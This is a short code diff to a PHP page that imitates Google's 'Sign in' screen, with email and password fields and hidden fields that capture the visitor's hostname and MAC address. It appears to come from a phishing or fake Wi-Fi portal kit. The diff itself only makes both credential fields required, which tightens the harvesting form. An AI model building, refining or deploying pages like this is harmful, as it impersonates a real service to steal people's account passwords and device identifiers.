@@ -93,7 +93,7 @@ require_once('helper.php');
                         <h1 class='g-h1'>Sign in</h1>
                         <h2 class='g-h2'>Use your Google Account</h2>
                         <div class='login-content'>
-                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Email or phone">
+                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Email or phone" required>
                             <!-- <div class="invalid-email" style='display:none;'> -->
                                 <!-- SVG for the invalid icon -->
                                 <!-- <span class="invalid-icon">
@@ -102,7 +102,7 @@ require_once('helper.php');
                                     </svg>
                                 </span><span class='invalid-email-text-span'>Enter a valid email or phone number</span>
                             </div> -->
-                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Password">
+                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Password" required>
 
                             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
